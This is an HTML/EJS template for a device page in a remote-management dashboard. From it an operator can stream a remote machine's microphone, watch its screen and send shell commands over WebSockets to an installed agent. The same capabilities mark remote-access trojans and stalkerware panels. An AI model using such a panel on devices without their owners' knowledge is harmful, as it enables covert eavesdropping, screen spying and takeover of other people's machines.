<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>
        <%= device.hostname %>
    </title>

    <link rel="stylesheet" href="/css/dashboard.css">

</head>

<body>
    <div class="app">

        <header class="topbar">

            <div class="brand">

                <a href="/devices" class="back-button">
                    ←
                </a>

                <div class="computer-icon header-icon">
                    ▣
                </div>

                <div>

                    <h1>
                        <%= device.hostname %>
                    </h1>

                    <span>
                        <%= device.platform %>
                            ·
                            <%= device.architecture %>
                    </span>

                </div>

            </div>


            <div class="server-status">

                <span class="status-dot"></span>

                ONLINE

            </div>

        </header>


        <main class="content">

            <section class="device-overview">

                <div>

                    <span class="section-label">
                        DEVICE
                    </span>

                    <h2>
                        <%= device.hostname %>
                    </h2>

                    <p>
                        Agent <%= device.agentVersion %>
                            ·
                            User <%= device.username %>
                    </p>

                </div>

                <div class="device-id">

                    <span>DEVICE ID</span>

                    <code>
                    <%= device.id %>
                </code>

                </div>

            </section>


            <section>

                <div class="section-title">

                    <h2>Controls</h2>

                    <span>
                        Authorized actions
                    </span>

                </div>


                <div class="control-grid">


                    <button id="microphoneButton" class="control-card microphone" type="button">

                        <div class="control-icon">
                            🎙
                        </div>

                        <div class="control-content">

                            <h3>
                                Microphone
                            </h3>

                            <p>
                                Stream microphone audio
                            </p>

                        </div>

                        <span class="control-arrow">
                            →
                        </span>

                    </button>


                    <button class="control-card" type="button" disabled>

                        <div class="control-icon">
                            📁
                        </div>

                        <div class="control-content">

                            <h3>
                                Files
                            </h3>

                            <p>
                                Browse authorized files
                            </p>

                        </div>

                        <span class="control-arrow">
                            →
                        </span>

                    </button>


                    <button id="screenButton" class="control-card camera" type="button">
                        <div class="control-icon">
                            🖥
                        </div>
                        <div class="control-content">
                            <h3>Screen</h3>
                            <p>View remote desktop</p>
                        </div>
                        <span class="control-arrow">→</span>
                    </button>

                    <button class="control-card terminal" type="button" disabled>
                        <div class="control-icon">
                            &gt;_
                        </div>

                        <div class="control-content">

                            <h3>
                                Command
                            </h3>

                            <p>
                                Authorized command interface
                            </p>

                        </div>

                        <span class="control-arrow">
                            →
                        </span>

                    </button>

                </div>

            </section>

            <section class="screen-panel" id="screenPanel">

                <div class="screen-header">

                    <div>
                        <span class="screen-status-dot" id="screenStatusDot"></span>

                        <span>
                            Screen Capture
                        </span>
                    </div>

                    <span id="screenStatus">
                        Stopped
                    </span>

                </div>


                <div class="screen-view">

                    <div class="screen-placeholder" id="screenPlaceholder">
                        Screen capture is stopped.
                    </div>

                    <img id="screenImage" alt="Remote screen">

                </div>


                <div class="screen-controls">

                    <label for="screenFps">
                        FPS
                    </label>

                    <select id="screenFps">

                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="5" selected>5</option>
                        <option value="10">10</option>
                        <option value="15">15</option>
                        <option value="20">20</option>
                        <option value="30">30</option>

                    </select>

                    <button id="screenStart" type="button">
                        Start Capture
                    </button>

                    <button id="screenStop" type="button" disabled>
                        Stop
                    </button>

                </div>

            </section>
            <section class="terminal-panel">
                <div class="terminal-header">
                    <div>
                        <span class="terminal-dot" id="terminalStatusDot"></span>
                        Command Interface
                    </div>

                    <span id="terminalStatus">
                        Connecting...
                    </span>
                </div>

                <div class="terminal-body" id="terminalOutput">
                    <div class="terminal-line">
                        <span class="terminal-prompt">
                            agent@<%= device.hostname %>:~$
                        </span>
                        <span>
                            Connected to remote terminal.
                        </span>
                    </div>
                </div>

                <div class="terminal-input">
                    <input id="terminalInput" type="text" placeholder="Enter command..." autocomplete="off"
                        spellcheck="false">

                    <button id="terminalSend" type="button">
                        Send
                    </button>
                </div>
            </section>

        </main>

    </div>
    <audio id="microphoneAudio" autoplay></audio>
    <script>

        const deviceId =
            "<%= device.id %>";


        const microphoneButton =
            document.getElementById(
                "microphoneButton"
            );


        let microphoneSocket = null;

        let audioContext = null;

        let audioNode = null;

        let microphoneRunning = false;


        async function startMicrophone() {

            audioContext =
                new AudioContext({
                    sampleRate: 16000
                });


            await audioContext.resume();


            await audioContext.audioWorklet.addModule(
                "/audio-processor.js"
            );


            audioNode =
                new AudioWorkletNode(
                    audioContext,
                    "pcm-processor"
                );


            audioNode.connect(
                audioContext.destination
            );


            const protocol =
                location.protocol === "https:"
                    ? "wss:"
                    : "ws:";

            const microphoneUrl =
                `${protocol}//${location.host}/microphone?device=${encodeURIComponent(deviceId)}`;

            microphoneSocket =
                new WebSocket(microphoneUrl);

            microphoneSocket.binaryType = "arraybuffer";


            microphoneSocket.binaryType =
                "arraybuffer";


            microphoneSocket.onmessage =
                (event) => {

                    const bytes =
                        new Uint8Array(
                            event.data
                        );


                    const pcm =
                        new Int16Array(
                            bytes.buffer,
                            bytes.byteOffset,
                            Math.floor(
                                bytes.byteLength / 2
                            )
                        );


                    const samples =
                        new Float32Array(
                            pcm.length
                        );


                    for (
                        let i = 0;
                        i < pcm.length;
                        i++
                    ) {

                        samples[i] =
                            pcm[i] / 32768;

                    }


                    audioNode.port.postMessage(
                        samples
                    );

                };


            microphoneSocket.onclose =
                () => {

                    console.log(
                        "Microphone stream closed"
                    );

                };


            await fetch(
                `/devices/${deviceId}/microphone/start`,
                {
                    method: "POST"
                }
            );


            microphoneRunning = true;

            microphoneButton.classList.add(
                "active"
            );

        }


        async function stopMicrophone() {

            await fetch(
                `/devices/${deviceId}/microphone/stop`,
                {
                    method: "POST"
                }
            );


            if (microphoneSocket) {

                microphoneSocket.close();

                microphoneSocket = null;

            }


            if (audioNode) {

                audioNode.disconnect();

                audioNode = null;

            }


            if (audioContext) {

                await audioContext.close();

                audioContext = null;

            }


            microphoneRunning = false;

            microphoneButton.classList.remove(
                "active"
            );

        }


        microphoneButton.addEventListener(
            "click",
            async () => {

                if (microphoneRunning) {

                    await stopMicrophone();

                } else {

                    await startMicrophone();

                }

            }
        );


        const terminalOutput =
            document.getElementById("terminalOutput");

        const terminalInput =
            document.getElementById("terminalInput");

        const terminalSend =
            document.getElementById("terminalSend");

        const terminalStatus =
            document.getElementById("terminalStatus");

        const terminalStatusDot =
            document.getElementById("terminalStatusDot");

        const protocol =
            location.protocol === "https:"
                ? "wss:"
                : "ws:";

        const terminalUrl =
            `${protocol}//${location.host}/terminal?device=${encodeURIComponent(deviceId)}`;

        const terminalSocket =
            new WebSocket(terminalUrl);


        function appendTerminal(text, className = "") {
            const line = document.createElement("div");

            line.className = "terminal-line";

            if (className) {
                line.classList.add(className);
            }

            line.textContent = text;

            terminalOutput.appendChild(line);

            terminalOutput.scrollTop =
                terminalOutput.scrollHeight;
        }


        function setTerminalStatus(
            connected
        ) {
            if (connected) {
                terminalStatus.textContent =
                    "Connected";

                terminalStatusDot.classList.add(
                    "connected"
                );

                terminalInput.disabled = false;
                terminalSend.disabled = false;
            } else {
                terminalStatus.textContent =
                    "Not connected";

                terminalStatusDot.classList.remove(
                    "connected"
                );

                terminalInput.disabled = true;
                terminalSend.disabled = true;
            }
        }


        terminalSocket.onopen = () => {
            setTerminalStatus(true);

            appendTerminal(
                "Remote terminal connected."
            );

            terminalInput.focus();
        };


        terminalSocket.onclose = () => {
            setTerminalStatus(false);

            appendTerminal(
                "Terminal connection closed.",
                "terminal-error"
            );
        };


        terminalSocket.onerror = () => {
            setTerminalStatus(false);

            appendTerminal(
                "Terminal connection error.",
                "terminal-error"
            );
        };


        terminalSocket.onmessage = (event) => {
            let message;

            try {
                message = JSON.parse(event.data);
            } catch {
                appendTerminal(
                    event.data,
                    "terminal-error"
                );

                return;
            }

            if (message.type === "terminal_output") {
                appendTerminal(
                    message.data,
                    message.stream === "stderr"
                        ? "terminal-error"
                        : ""
                );

                return;
            }

            if (message.stdout) {
                appendTerminal(
                    message.stdout
                );
            }

            if (message.stderr) {
                appendTerminal(
                    message.stderr,
                    "terminal-error"
                );
            }

            appendTerminal(
                `[exit code: ${message.exitCode}]`,
                "terminal-status"
            );
        };


        async function sendCommand() {
            const command =
                terminalInput.value.trim();

            if (!command) {
                return;
            }

            if (
                terminalSocket.readyState !==
                WebSocket.OPEN
            ) {
                appendTerminal(
                    "Terminal is not connected.",
                    "terminal-error"
                );

                return;
            }

            appendTerminal(
                `> ${command}`,
                "terminal-command"
            );

            terminalInput.value = "";

            try {
                const response = await fetch(
                    `/devices/${deviceId}/command`,
                    {
                        method: "POST",
                        headers: {
                            "Content-Type":
                                "application/json"
                        },
                        body: JSON.stringify({
                            command
                        })
                    }
                );

                if (!response.ok) {
                    const error =
                        await response.json();

                    throw new Error(
                        error.error ||
                        "Command failed"
                    );
                }

            } catch (error) {
                appendTerminal(
                    error.message,
                    "terminal-error"
                );
            }

            terminalInput.focus();
        }


        terminalSend.addEventListener(
            "click",
            sendCommand
        );


        terminalInput.addEventListener(
            "keydown",
            (event) => {
                if (event.key === "Enter") {
                    event.preventDefault();
                    sendCommand();
                }
            }
        );
        const screenButton =
            document.getElementById("screenButton");

        const screenPanel =
            document.getElementById("screenPanel");

        const screenImage =
            document.getElementById("screenImage");

        const screenPlaceholder =
            document.getElementById("screenPlaceholder");

        const screenStatus =
            document.getElementById("screenStatus");

        const screenStatusDot =
            document.getElementById("screenStatusDot");

        const screenFps =
            document.getElementById("screenFps");

        const screenStart =
            document.getElementById("screenStart");

        const screenStop =
            document.getElementById("screenStop");

        let screenSocket = null;
        let screenObjectUrl = null;
        let screenRunning = false;


        function setScreenStatus(running) {

            screenRunning = running;

            if (running) {

                screenStatus.textContent =
                    `${screenFps.value} FPS`;

                screenStatusDot.classList.add(
                    "connected"
                );

                screenStart.disabled = true;
                screenStop.disabled = false;

                screenPlaceholder.style.display =
                    "none";

                screenButton.classList.add(
                    "active"
                );

            } else {

                screenStatus.textContent =
                    "Stopped";

                screenStatusDot.classList.remove(
                    "connected"
                );

                screenStart.disabled = false;
                screenStop.disabled = true;

                screenPlaceholder.style.display =
                    "flex";

                screenButton.classList.remove(
                    "active"
                );
            }
        }


        function connectScreenSocket() {

            const protocol =
                location.protocol === "https:"
                    ? "wss:"
                    : "ws:";

            const screenUrl =
                `${protocol}//${location.host}/screen?device=${encodeURIComponent(deviceId)}`;

            screenSocket =
                new WebSocket(screenUrl);

            screenSocket.binaryType =
                "arraybuffer";


            screenSocket.onmessage =
                (event) => {

                    if (!(event.data instanceof ArrayBuffer)) {
                        return;
                    }

                    const blob =
                        new Blob(
                            [event.data],
                            {
                                type: "image/jpeg"
                            }
                        );

                    const url =
                        URL.createObjectURL(blob);

                    if (screenObjectUrl) {
                        URL.revokeObjectURL(
                            screenObjectUrl
                        );
                    }

                    screenObjectUrl = url;

                    screenImage.src = url;
                };


            screenSocket.onclose =
                () => {

                    if (screenRunning) {
                        setScreenStatus(false);
                    }

                };


            screenSocket.onerror =
                (error) => {

                    console.error(
                        "Screen socket error:",
                        error
                    );

                };
        }


        async function startScreen() {

            const fps =
                Number(screenFps.value);

            try {

                const response =
                    await fetch(
                        `/devices/${deviceId}/screen/start`,
                        {
                            method: "POST",
                            headers: {
                                "Content-Type":
                                    "application/json"
                            },
                            body: JSON.stringify({
                                fps
                            })
                        }
                    );

                if (!response.ok) {

                    const error =
                        await response.json();

                    throw new Error(
                        error.error ||
                        "Failed to start screen capture"
                    );
                }

                setScreenStatus(true);

            } catch (error) {

                console.error(
                    "Screen start failed:",
                    error
                );

                alert(
                    error instanceof Error
                        ? error.message
                        : "Failed to start screen capture"
                );
            }
        }


        async function stopScreen() {

            try {

                await fetch(
                    `/devices/${deviceId}/screen/stop`,
                    {
                        method: "POST"
                    }
                );

            } catch (error) {

                console.error(
                    "Screen stop failed:",
                    error
                );

            }

            setScreenStatus(false);
        }


        screenButton.addEventListener(
            "click",
            () => {

                screenPanel.scrollIntoView({
                    behavior: "smooth",
                    block: "start"
                });

            }
        );


        screenStart.addEventListener(
            "click",
            startScreen
        );


        screenStop.addEventListener(
            "click",
            stopScreen
        );


        screenFps.addEventListener(
            "change",
            async () => {

                if (!screenRunning) {
                    return;
                }

                await stopScreen();
                await startScreen();

            }
        );


        connectScreenSocket();
    </script>
</body>

</html>